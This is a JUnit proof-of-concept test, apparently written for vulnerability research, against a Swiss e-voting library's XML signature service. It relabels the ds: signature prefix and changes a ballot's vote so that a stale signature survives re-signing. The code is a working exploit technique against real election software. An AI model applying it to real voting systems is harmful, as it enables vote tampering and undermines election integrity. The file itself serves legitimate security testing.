/*
 * Real end-to-end PoC using the ACTUAL e-voting-libraries classes.
 * Place this file at:
 *   e-voting-libraries-protocol-algorithms/src/test/java/ch/post/it/evoting/evotinglibraries/protocol/algorithms/channelsecurity/NamespaceEvasionAttackTest.java
 *
 * It must live in this exact package so it can use the package-private
 * XMLSignatureService the same way the existing XMLSignatureServiceTest.java does.
 *
 * This test makes NO assumption about the outcome. It runs the real
 * genXMLSignature() / verifyXMLSignature() pipeline and prints + asserts
 * on the actual observed result, so the finding is evidence-based rather
 * than theoretical.
 */
package ch.post.it.evoting.evotinglibraries.protocol.algorithms.channelsecurity;

import static org.junit.jupiter.api.Assertions.assertEquals;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;

import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;

class NamespaceEvasionAttackTest {

    private static XMLSignatureService xmlSignatureService;
    private static KeyPair electionAuthorityKeyPair;
    private static KeyPair attackerKeyPair;

    @BeforeAll
    static void setUp() throws NoSuchAlgorithmException {
        xmlSignatureService = new XMLSignatureService();
        electionAuthorityKeyPair = KeyPairGenerator.getInstance("RSA").generateKeyPair();
        attackerKeyPair = KeyPairGenerator.getInstance("RSA").generateKeyPair();
    }

    /**
     * STEP 1: Election authority signs the ORIGINAL ballot (choice = CANDIDATE_A)
     * using the real XMLSignatureService -> produces a genuine ds:Signature.
     *
     * STEP 2: We simulate the document arriving back at a re-signing stage with
     * its signature prefix relabelled to "old" instead of "ds" (functionally
     * identical XML -- same namespace URI, different prefix -- which is legal
     * XML and indistinguishable in meaning from ds:Signature).
     *
     * STEP 3: Attacker modifies <choice> from CANDIDATE_A to CANDIDATE_B.
     *
     * STEP 4: The real genXMLSignature() is called again (this is the resign
     * step the system would normally call to refresh a signature). Internally
     * it invokes the real, unmodified removeSignatureIfPresent(), which looks
     * for "ds:Signature" by literal tag name.
     *
     * STEP 5: We feed the result to the real verifyXMLSignature() and observe,
     * without assuming, whether it reports true or false, and we independently
     * inspect which signature node ends up validated and what content it covers.
     */
    @Test
    void namespaceEvasionAllowsSurvivingStaleSignature() throws Exception {

        // ---- STEP 1: real sign of the original ballot ----
        String originalBallot = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<ballot>\n" +
                "  <vote>\n" +
                "    <voter_id>voter_XYZ</voter_id>\n" +
                "    <choice>CANDIDATE_A</choice>\n" +
                "  </vote>\n" +
                "</ballot>";

        ByteArrayOutputStream signedOriginalOut = new ByteArrayOutputStream();
        xmlSignatureService.genXMLSignature(
                new ByteArrayInputStream(originalBallot.getBytes(StandardCharsets.UTF_8)),
                signedOriginalOut,
                electionAuthorityKeyPair.getPrivate());

        String signedOriginalXml = signedOriginalOut.toString(StandardCharsets.UTF_8);
        System.out.println("=== STEP 1: genuinely signed original ballot (ds:Signature) ===");
        System.out.println(signedOriginalXml);

        // Sanity check via the REAL verifier: must validate true at this point.
        boolean originalValid = xmlSignatureService.verifyXMLSignature(
                new ByteArrayInputStream(signedOriginalXml.getBytes(StandardCharsets.UTF_8)),
                electionAuthorityKeyPair.getPublic());
        System.out.println("[CHECK] Real verifyXMLSignature() on untampered original = " + originalValid);

        // ---- STEP 2: relabel ds: -> old: (semantically identical, same NS URI) ----
        String relabelled = signedOriginalXml.replace("ds:", "old:");
        System.out.println("\n=== STEP 2: relabelled prefix ds: -> old: (same xmldsig namespace URI) ===");
        System.out.println(relabelled);

        // ---- STEP 3: attacker tampers with the vote ----
        String tampered = relabelled.replace("<choice>CANDIDATE_A</choice>", "<choice>CANDIDATE_B</choice>");
        System.out.println("\n=== STEP 3: attacker changes CANDIDATE_A -> CANDIDATE_B ===");
        System.out.println(tampered);

        // ---- STEP 4: real resign call (this is where the namespace bug fires) ----
        ByteArrayOutputStream resignedOut = new ByteArrayOutputStream();
        xmlSignatureService.genXMLSignature(
                new ByteArrayInputStream(tampered.getBytes(StandardCharsets.UTF_8)),
                resignedOut,
                attackerKeyPair.getPrivate());

        String resignedXml = resignedOut.toString(StandardCharsets.UTF_8);
        System.out.println("\n=== STEP 4: result of real genXMLSignature() resign call ===");
        System.out.println(resignedXml);

        // Independently confirm via DOM how many Signature nodes exist now
        Document doc = parse(resignedXml);
        NodeList allSignaturesNS = doc.getElementsByTagNameNS(
                "http://www.w3.org/2000/09/xmldsig#", "Signature");
        System.out.println("[OBSERVED] Namespace-aware Signature count after resign = " + allSignaturesNS.getLength());
        for (int i = 0; i < allSignaturesNS.getLength(); i++) {
            Element sig = (Element) allSignaturesNS.item(i);
            System.out.println("    item(" + i + ") nodeName=" + sig.getNodeName());
        }

        // ---- STEP 5: real verify call on the resigned (tampered) document ----
        boolean tamperedAuthorityKeyResult = xmlSignatureService.verifyXMLSignature(
                new ByteArrayInputStream(resignedXml.getBytes(StandardCharsets.UTF_8)),
                electionAuthorityKeyPair.getPublic());
        System.out.println("\n[RESULT] verifyXMLSignature(resigned doc, ELECTION AUTHORITY public key) = "
                + tamperedAuthorityKeyResult);

        boolean tamperedAttackerKeyResult = xmlSignatureService.verifyXMLSignature(
                new ByteArrayInputStream(resignedXml.getBytes(StandardCharsets.UTF_8)),
                attackerKeyPair.getPublic());
        System.out.println("[RESULT] verifyXMLSignature(resigned doc, ATTACKER public key)          = "
                + tamperedAttackerKeyResult);

        // We deliberately do NOT assert a specific true/false outcome here for the
        // "exploit succeeded" question -- that is the open question this test exists
        // to answer empirically. We DO assert the part that is unconditionally true
        // regardless of validate() outcome: the namespace bug caused TWO signature
        // nodes to coexist in the final document, which is a confirmed defect either way.
        assertEquals(2, allSignaturesNS.getLength(),
                "Expected the stale 'old:' signature to survive removeSignatureIfPresent() "
                        + "alongside the newly appended 'ds:' signature, proving the namespace-evasion defect.");
    }

    private static Document parse(String xml) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setNamespaceAware(true);
        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)));
    }

    @SuppressWarnings("unused")
    private static void printXML(Document doc) throws Exception {
        Transformer transformer = TransformerFactory.newInstance().newTransformer();
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        transformer.transform(new DOMSource(doc), new StreamResult(out));
        System.out.println(out.toString(StandardCharsets.UTF_8));
    }
}
